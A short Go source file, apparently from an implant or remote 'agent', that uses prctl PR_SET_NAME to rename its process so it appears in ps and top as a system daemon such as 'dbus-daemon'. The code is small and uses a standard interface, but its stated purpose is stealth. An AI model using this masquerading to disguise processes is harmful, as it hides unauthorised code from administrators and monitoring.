//go:build linux

package opsec

import (
	"unsafe"

	"golang.org/x/sys/unix"
)

// setProcessName sets the kernel process/thread name via PR_SET_NAME (max 15
// bytes). This changes /proc/self/comm and the name shown by `ps`/`top`/`htop`,
// letting the agent blend in (e.g. "dbus-daemon"). The full cmdline
// (/proc/self/cmdline) is left untouched: overwriting argv memory risks a
// fault, so we keep to the safe, supported interface.
func setProcessName(name string) {
	if name == "" {
		return
	}
	if len(name) > 15 {
		name = name[:15]
	}
	buf := append([]byte(name), 0)
	_ = unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(&buf[0])), 0, 0, 0)
}
